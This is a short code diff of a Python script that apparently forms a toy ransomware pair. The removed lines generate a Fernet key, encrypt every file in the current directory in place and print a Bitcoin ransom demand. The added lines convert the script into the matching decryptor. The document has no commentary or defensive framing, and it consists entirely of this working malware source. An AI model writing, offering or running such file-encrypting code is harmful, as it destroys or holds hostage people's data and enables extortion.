@@ -9,15 +9,14 @@ for file in os.listdir():
     if os.path.isfile(file):
         files.append(file)
 
-key = Fernet.generate_key()
-with open("key.key", "wb") as keywrite:
-    keywrite.write(key)
+with open("key.key", "rb") as keyread:
+    mykey = keyread.read()
 
 for file in files:
     with open(file, "rb") as fileread:
         file_content = fileread.read()
-    encrypted_content = Fernet(key).encrypt(file_content)
+    decrypted_content = Fernet(mykey).decrypt(file_content)
     with open(file, "wb") as filewrite:
-        filewrite.write(encrypted_content)
+        filewrite.write(decrypted_content)
 
-print("FILES ENCRYPTED, PAY BITCOIN OR YOUR CUTE POTATO PC DIES!!!")
+print("FILES UNLOCKED! ENJOY YOUR POTATO PC")
